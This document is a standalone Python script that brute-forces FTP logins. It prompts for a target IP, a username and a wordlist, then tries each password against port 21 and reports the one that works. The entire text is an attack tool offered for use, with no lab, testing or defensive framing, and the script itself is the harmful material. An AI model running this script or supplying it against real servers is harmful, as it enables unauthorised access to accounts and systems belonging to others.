from ftplib import FTP

def brute_force_ftp(host, username, password_list):
    ftp = FTP()
    try:
        ftp.connect(host, 21)
        for password in password_list:
            try:
                ftp.login(user=username, passwd=password)
                print(f"Success! Password: {password}")
                return
            except:
                print(f"Failed: {password}")
        print("Brute force completed. Password not found.")
    except Exception as e:
        print(f"Connection error: {e}")

if __name__ == "__main__":
    target = input("Enter FTP server IP: ")
    user = input("Enter FTP username: ")
    pwd_file = input("Enter path to password list: ")
    with open(pwd_file, 'r') as f:
        passwords = f.read().splitlines()
    brute_force_ftp(target, user, passwords)
